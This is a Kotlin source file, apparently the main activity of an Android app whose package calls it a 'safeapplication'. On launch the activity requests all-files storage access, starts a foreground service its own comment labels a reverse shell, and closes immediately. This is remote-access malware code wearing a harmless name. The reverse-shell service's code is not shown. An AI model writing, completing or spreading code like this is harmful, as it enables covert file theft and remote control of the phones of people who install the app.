package com.solisindago.safeapplication

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        /* Ask for “All files” permission on Android 11 + */
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
            !android.os.Environment.isExternalStorageManager()
        ) {
            val uri = Uri.parse("package:$packageName")
            startActivity(
                Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }

        /* Start foreground reverse‑shell service */
        startForegroundService(Intent(this, ReverseShellService::class.java))

        /* Leave launcher alias enabled (no BuildConfig, no component toggle) */
        finish()
    }
}
